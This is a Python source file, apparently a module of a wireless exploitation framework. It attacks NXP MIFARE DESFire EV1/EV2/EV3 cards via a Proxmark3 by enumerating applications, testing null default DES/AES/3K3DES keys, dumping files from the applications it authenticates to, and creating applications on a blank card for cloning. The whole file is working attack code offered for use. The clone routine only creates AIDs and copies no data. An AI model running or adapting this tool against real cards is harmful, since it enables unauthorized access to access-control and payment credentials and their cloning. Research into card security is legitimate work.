#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""MIFARE DESFire EV1/EV2/EV3 attack module.

Implements authentication bypass, key recovery, and application
enumeration for NXP MIFARE DESFire cards. Supports DES/3K3DES/AES
key diversification analysis, application directory enumeration,
file access with default keys, and relay of DESFire APDU sessions.

References:
  https://github.com/RfidResearchGroup/proxmark3
  https://www.nxp.com/docs/en/data-sheet/MF3ICDX21_41_81_SDS.pdf
  https://github.com/revk/DESFireAES
  https://eprint.iacr.org/2011/566.pdf

MITRE ATT&CK: T1552.004 (Unsecured Credentials: Private Keys)
CWE: CWE-798 (Use of Hard-coded Credentials)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

DESFIRE_DEFAULT_DES_KEY = bytes(8)
DESFIRE_DEFAULT_AES_KEY = bytes(16)
DESFIRE_DEFAULT_3K3DES_KEY = bytes(24)

DESFIRE_CMD_GET_VERSION = "60"
DESFIRE_CMD_GET_APP_IDS = "6A"
DESFIRE_CMD_SELECT_APP = "5A"
DESFIRE_CMD_GET_FILE_IDS = "6F"
DESFIRE_CMD_AUTH_DES = "0A"
DESFIRE_CMD_AUTH_AES = "AA"
DESFIRE_CMD_READ_DATA = "BD"


class CryptoType(Enum):
    DES = auto()
    THREE_K3_DES = auto()
    AES128 = auto()
    UNKNOWN = auto()


class AttackMode(Enum):
    ENUM = auto()
    DEFAULT_KEYS = auto()
    DUMP = auto()
    CLONE = auto()
    RELAY = auto()


@dataclass
class DESFireApp:
    aid: str = ""
    crypto: CryptoType = CryptoType.UNKNOWN
    file_ids: list[int] = field(default_factory=list)
    key_count: int = 0
    authenticated: bool = False
    key_used: bytes = b""


@dataclass
class DESFireCard:
    uid: str = ""
    hw_vendor: str = ""
    hw_type: str = ""
    hw_version: str = ""
    sw_version: str = ""
    batch_no: str = ""
    production_date: str = ""
    apps: list[DESFireApp] = field(default_factory=list)
    picc_key_crypto: CryptoType = CryptoType.UNKNOWN


class DESFireAttack(Exploit):
    """MIFARE DESFire EV1/EV2/EV3 attack module."""

    __info__: dict[str, Any] = {
        "name": "MIFARE DESFire Attack",
        "description": (
            "Authentication bypass and key recovery for NXP MIFARE DESFire "
            "EV1/EV2/EV3. Application enumeration, default key testing, "
            "file dumping, and credential cloning via Proxmark3."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/RfidResearchGroup/proxmark3",
            "https://www.nxp.com/docs/en/data-sheet/MF3ICDX21_41_81_SDS.pdf",
            "https://eprint.iacr.org/2011/566.pdf",
        ),
        "devices": ("MIFARE DESFire EV1", "MIFARE DESFire EV2", "MIFARE DESFire EV3"),
        "severity": "high",
        "cvss": "8.1",
        "cve": "generic",
        "mitre": ["T1552.004"],
    }

    attack = OptString("enum", "Attack: enum, default_keys, dump, clone, relay")
    pm3_port = OptString("/dev/ttyACM0", "Proxmark3 serial port")
    target_aid = OptString("", "Target application AID (hex, 6 chars, empty=all)")
    key_no = OptInteger(0, "Key number for authentication")
    custom_key = OptString("", "Custom key hex (16/32/48 chars for DES/3K3DES/AES)")
    timeout_sec = OptInteger(60, "Operation timeout")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._card: DESFireCard | None = None

    def check(self) -> str:
        """Verify Proxmark3 with DESFire support."""
        if not shutil.which("proxmark3"):
            return "Proxmark3 not found. Install RRG fork."
        output = self._pm3("hw version")
        if "RRG" in output or "Iceman" in output:
            return "Proxmark3 RRG/Iceman firmware (DESFire supported)"
        if output:
            return "Proxmark3 detected (verify RRG firmware for DESFire)"
        return "Could not connect to Proxmark3"

    def _pm3(self, cmd: str) -> str:
        """Execute Proxmark3 command."""
        if self.dry_run.value:
            print_info(f"[dry-run] pm3 --> {cmd}")
            return "[dry-run]"
        try:
            result = subprocess.run(
                ["proxmark3", str(self.pm3_port.value), "-c", cmd],
                capture_output=True, text=True,
                timeout=int(self.timeout_sec.value),
            )
            return result.stdout + result.stderr
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            logger.error("pm3 failed: %s", exc)
            return ""

    def _get_card_info(self) -> DESFireCard | None:
        """Read DESFire card version info."""
        print_status("[*] Reading DESFire card info...")
        output = self._pm3("hf mfdes info")

        card = DESFireCard()
        for line in output.splitlines():
            s = line.strip()
            if "UID" in s:
                parts = s.split(":")
                if len(parts) > 1:
                    card.uid = parts[-1].strip().replace(" ", "")
            elif "HW vendor" in s or "Hardware" in s:
                card.hw_vendor = s.split(":")[-1].strip() if ":" in s else ""
            elif "SW version" in s or "Software" in s:
                card.sw_version = s.split(":")[-1].strip() if ":" in s else ""
            elif "Batch" in s:
                card.batch_no = s.split(":")[-1].strip() if ":" in s else ""

        if card.uid:
            print_success(f"[+] DESFire card UID={card.uid}")
            if card.sw_version:
                print_info(f"    SW: {card.sw_version}")
            return card

        print_warning("[!] No DESFire card detected")
        return None

    def _enumerate_apps(self, card: DESFireCard) -> None:
        """Enumerate applications on card."""
        print_status("[*] Enumerating applications...")
        output = self._pm3("hf mfdes getaids")

        for line in output.splitlines():
            s = line.strip()
            if len(s) == 6:
                try:
                    int(s, 16)
                    app = DESFireApp(aid=s.upper())
                    card.apps.append(app)
                except ValueError:
                    continue
            elif "AID" in s and ":" in s:
                aid_part = s.split(":")[-1].strip().replace(" ", "")
                if len(aid_part) == 6:
                    try:
                        int(aid_part, 16)
                        app = DESFireApp(aid=aid_part.upper())
                        card.apps.append(app)
                    except ValueError:
                        continue

        if card.apps:
            print_success(f"[+] Found {len(card.apps)} application(s)")
            for app in card.apps:
                print_info(f"    AID: {app.aid}")
        else:
            print_warning("[!] No applications found (or PICC master key required)")

    def _get_file_ids(self, aid: str) -> list[int]:
        """Get file IDs for an application."""
        output = self._pm3(f"hf mfdes getfileids --aid {aid}")
        file_ids: list[int] = []
        for line in output.splitlines():
            s = line.strip()
            for token in s.split():
                try:
                    fid = int(token, 16) if len(token) <= 2 else int(token)
                    if 0 <= fid <= 31:
                        file_ids.append(fid)
                except ValueError:
                    continue
        return file_ids

    def _try_default_keys(self, card: DESFireCard) -> int:
        """Test default keys against all applications."""
        print_status("[*] Testing default keys...")
        authenticated = 0

        targets = card.apps if card.apps else [DESFireApp(aid="000000")]

        for app in targets:
            for key_name, key_hex, algo in [
                ("DES null", DESFIRE_DEFAULT_DES_KEY.hex(), "des"),
                ("AES null", DESFIRE_DEFAULT_AES_KEY.hex(), "aes"),
                ("3K3DES null", DESFIRE_DEFAULT_3K3DES_KEY.hex(), "3k3des"),
            ]:
                cmd = (
                    f"hf mfdes auth --aid {app.aid} --keyno 0 "
                    f"--algo {algo} -k {key_hex}"
                )
                output = self._pm3(cmd)

                if "authenticated" in output.lower() or "ok" in output.lower():
                    app.authenticated = True
                    app.key_used = bytes.fromhex(key_hex)
                    if algo == "des":
                        app.crypto = CryptoType.DES
                    elif algo == "aes":
                        app.crypto = CryptoType.AES128
                    else:
                        app.crypto = CryptoType.THREE_K3_DES

                    print_success(
                        f"[+] AID {app.aid}: {key_name} key works! "
                        f"(algo={algo})"
                    )
                    authenticated += 1

                    app.file_ids = self._get_file_ids(app.aid)
                    if app.file_ids:
                        print_info(f"    Files: {app.file_ids}")
                    break

        return authenticated

    def _dump_app_files(self, card: DESFireCard) -> None:
        """Dump files from authenticated applications."""
        print_status("[*] Dumping application files...")

        for app in card.apps:
            if not app.authenticated:
                print_warning(f"[!] AID {app.aid}: not authenticated, skipping")
                continue

            if not app.file_ids:
                app.file_ids = self._get_file_ids(app.aid)

            for fid in app.file_ids:
                algo = "des"
                if app.crypto == CryptoType.AES128:
                    algo = "aes"
                elif app.crypto == CryptoType.THREE_K3_DES:
                    algo = "3k3des"

                cmd = (
                    f"hf mfdes read --aid {app.aid} --fid {fid:02X} "
                    f"--keyno 0 --algo {algo} -k {app.key_used.hex()}"
                )
                output = self._pm3(cmd)

                data_lines: list[str] = []
                for line in output.splitlines():
                    s = line.strip()
                    if s and all(c in "0123456789abcdefABCDEF " for c in s):
                        data_lines.append(s.replace(" ", ""))

                if data_lines:
                    raw = "".join(data_lines)
                    print_success(f"[+] AID {app.aid} File {fid}: {len(raw)//2} bytes")
                    if len(raw) <= 64:
                        print_info(f"    Data: {raw.upper()}")
                    else:
                        print_info(f"    Data: {raw[:64].upper()}...")
                else:
                    print_info(f"    AID {app.aid} File {fid}: empty or read failed")

    def _clone_card(self, card: DESFireCard) -> None:
        """Clone DESFire card to blank target."""
        print_status("[*] DESFire clone: writing apps to blank card")
        print_warning("[!] Target must be a blank DESFire card with default PICC key")

        for app in card.apps:
            if not app.authenticated:
                print_warning(f"[!] AID {app.aid}: not authenticated, cannot clone")
                continue

            cmd = f"hf mfdes createaid --aid {app.aid} --fid {app.aid[:4]} --ks1 0x0F --ks2 0x0E"
            output = self._pm3(cmd)

            if "ok" in output.lower() or self.dry_run.value:
                print_success(f"[+] Created AID {app.aid} on target")
            else:
                print_error(f"[-] Failed to create AID {app.aid}")

    def run(self) -> None:
        """Execute DESFire attack."""
        print_status("[*] MIFARE DESFire Attack v1.0.0")

        card = self._get_card_info()
        if not card:
            return
        self._card = card

        attack_str = str(self.attack.value).lower()

        if attack_str == "enum":
            self._enumerate_apps(card)
            for app in card.apps:
                app.file_ids = self._get_file_ids(app.aid)
                if app.file_ids:
                    print_info(f"    AID {app.aid} files: {app.file_ids}")

        elif attack_str == "default_keys":
            self._enumerate_apps(card)
            count = self._try_default_keys(card)
            print_info(f"[*] {count} app(s) authenticated with default keys")

        elif attack_str == "dump":
            self._enumerate_apps(card)
            self._try_default_keys(card)
            self._dump_app_files(card)

        elif attack_str == "clone":
            self._enumerate_apps(card)
            self._try_default_keys(card)
            self._dump_app_files(card)
            print_status("[*] Place blank DESFire card on reader...")
            self._clone_card(card)

        elif attack_str == "relay":
            print_status("[*] DESFire APDU relay mode")
            print_info("[*] Use nfc_relay_native module for full relay functionality")

        else:
            print_error(f"[-] Unknown attack: {attack_str}")
            return

        print_status(f"\n[*] Card: UID={card.uid}")
        print_info(f"    Applications: {len(card.apps)}")
        auth_count = sum(1 for a in card.apps if a.authenticated)
        if auth_count:
            print_success(f"    Authenticated: {auth_count}/{len(card.apps)}")
